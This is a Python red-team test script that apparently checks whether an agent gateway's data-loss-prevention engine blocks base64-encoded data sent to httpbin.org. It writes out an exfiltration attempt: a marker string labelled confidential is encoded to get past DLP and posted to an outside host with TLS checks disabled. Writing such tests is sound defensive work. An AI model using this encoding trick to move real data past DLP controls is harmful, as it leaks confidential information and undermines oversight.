import sys
import os
import requests
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'sdk', 'python')))
from gateway import ATPClient

print("--- Red-Team Test: Encoding-based Obfuscation ---")
ATPClient.infiltrate(agent_id="bot-omega")

print("\nAttempting to bypass DLP with base64 encoded payload...")
obfuscated = base64.b64encode(b"CONFIDENTIAL").decode("utf-8")

try:
    response = requests.post(
        "https://httpbin.org/post",
        json={"message": obfuscated, "amount": 10.0},
        timeout=10,
        verify=False
    )
    if response.status_code == 200:
        print("FAILURE: Base64 obfuscated payload bypassed DLP!")
        sys.exit(1)
    else:
        print(f"SUCCESS: Request BLOCKED by DLP Engine. Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request Failed: {e}")
